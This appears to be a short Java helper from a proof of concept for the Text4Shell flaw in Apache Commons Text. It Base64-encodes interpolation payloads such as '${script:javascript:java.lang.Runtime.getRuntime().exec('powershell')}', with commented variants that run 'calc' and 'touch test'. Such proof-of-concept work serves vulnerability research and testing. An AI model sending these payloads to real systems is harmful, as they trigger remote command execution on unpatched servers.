package tech.cybersword.poc.log4jtext4shell;

import java.util.Base64;

public class Base64Util {

	public static void main(String[] args) {
		// String test = "${script:javascript:java.lang.Runtime.getRuntime().exec('touch
		// test')}";
		// String test =
		// "${script:javascript:java.lang.Runtime.getRuntime().exec('calc')}";
		String test = "${script:javascript:java.lang.Runtime.getRuntime().exec('powershell')}";
		String base64 = Base64.getEncoder().encodeToString(test.getBytes());
		System.out.println(base64);
	}
	// ${script:javascript:java.lang.Runtime.getRuntime().exec('calc')}
}